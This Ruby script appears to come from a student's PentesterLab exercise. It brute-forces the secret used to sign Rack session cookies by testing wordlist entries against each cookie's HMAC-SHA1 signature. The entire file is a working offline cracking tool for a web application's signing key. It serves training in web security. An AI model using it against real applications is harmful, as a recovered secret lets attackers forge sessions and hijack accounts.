require 'uri'
require 'openssl'

# usage: find-secret <cookie> <wordlist>
# 
# Params:
#   cookie      :   File containing url encoded rack cookies. One per line
#   wordlist    :   brute force word file, one word per line
#
# Script to brute force the secret data used to sign a rack cookie
#
# https://www.pentesterlab.com/exercises/rack_cookies_and_commands_injection/
#
# Author: Alexander DuPree
# https://gitlab.com/adupree/cs495-alexander-dupree/RCCI


def generate_hmac(data, secret)
    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

def find_secret(cookie, words)

    data, signature = cookie.split('--', 2)

    data = URI.decode(data)

    for word in words
        if generate_hmac(data, word) == signature
            return word
        end
    end
    return nil
end

def main

    if ARGV.length != 2
        puts('usage: find-secret <cookie> <wordlist>')
        return 1
    end

    cookies = IO.readlines(ARGV[0], chomp: true)
    words   = IO.readlines(ARGV[1], chomp: true)

    for cookie in cookies
        secret = find_secret(cookie, words)
        if secret.nil?
            puts('find-secret: Brute force failed. Try a different dictionary or check your cookie')
        else
            puts('Secret found: ' + secret)
        end
    end
    return 0
end

main